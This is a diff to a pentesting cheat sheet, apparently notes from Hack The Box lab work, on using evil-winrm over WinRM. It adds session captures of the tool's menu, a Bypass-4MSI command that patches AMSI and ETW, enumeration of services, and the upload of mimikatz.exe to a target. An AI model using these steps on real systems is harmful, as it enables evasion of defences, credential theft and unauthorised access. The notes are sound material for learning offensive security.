@@ -1,4 +1,5 @@
 
+### Connecting
 
 default ports: 5895 and 5896 (and 47001)
 
@@ -19,12 +20,93 @@ Invoke-Mimikatz
 ```
 
 
-
 https://github.com/Hackplayers/evil-winrm
 https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
 
 to make `menu` have poweshell scripts
 `evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'`
+
+### Commands in evil-winrm
+
+##### menu
+
+```powershell
+*Evil-WinRM* PS C:\Users\emily\desktop> menu
+
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+```
+
+##### Bypass-4MSI
+
+```powershell
+*Evil-WinRM* PS C:\Users\emily\desktop> Bypass-4MSI
+
+Info: Patching 4MSI, please be patient...
+
+[+] Success!
+
+Info: Patching ETW, please be patient ..
+
+[+] Success!
+```
+
+##### services
+
+```powershell
+*Evil-WinRM* PS C:\Users\emily\desktop> services
+
+Path                                                                                    Privileges Service                      
+----                                                                                    ---------- -------                      
+C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                    False ADWS                         
+"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc                   False edgeupdate                   
+"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc                False edgeupdatem                  
+"C:\Program Files (x86)\Microsoft\Edge\Application\130.0.2849.56\elevation_service.exe"      False MicrosoftEdgeElevationService
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                 True NetTcpPortSharing            
+C:\Windows\SysWow64\perfhost.exe                                                             False PerfHost                     
+"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                   False Sense                        
+C:\Windows\servicing\TrustedInstaller.exe                                                    False TrustedInstaller             
+"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                       False VGAuthService                
+"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                          False VMTools                      
+"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\NisSrv.exe"               True WdNisSvc                     
+"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"              True WinDefend                    
+"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                         False WMPNetworkSvc  
+```
+
+##### upload
+
+```powershell
+*Evil-WinRM* PS C:\Users\emily\Documents> upload mimikatz.exe
+
+Info: Uploading /home/fixit42/boxes/htb/administrator/mimikatz.exe to C:\Users\emily\Documents\mimikatz.exe
+
+Data: 1807016 bytes of 1807016 bytes copied
+
+Info: Upload successful!
+```
+
+##### download
+
+```powershell
+
+```
 
 ### Help
 
